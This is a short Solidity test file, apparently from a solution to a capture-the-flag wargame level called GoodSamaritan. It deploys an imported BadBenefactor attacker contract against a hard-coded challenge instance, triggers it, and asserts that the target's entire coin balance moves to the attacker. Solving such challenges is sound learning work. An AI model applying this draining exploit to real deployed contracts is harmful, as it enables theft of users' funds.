// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {GoodSamaritan} from "../instances/Ilevel27.sol";
import {BadBenefactor} from "../src/level27.sol";

contract Attacker is Test {
    GoodSamaritan goodSamaritan = GoodSamaritan(0x7a295bC2123eaa0B2c5aeF4B72B6a011cE09FF30);

    function test() external {
        BadBenefactor badBenefactor = new BadBenefactor(address(goodSamaritan));
        badBenefactor.beg();

        assertEq(goodSamaritan.coin().balances(address(goodSamaritan)), 0);
        assertEq(goodSamaritan.coin().balances(address(badBenefactor)), 10 ** 6);
    }
}
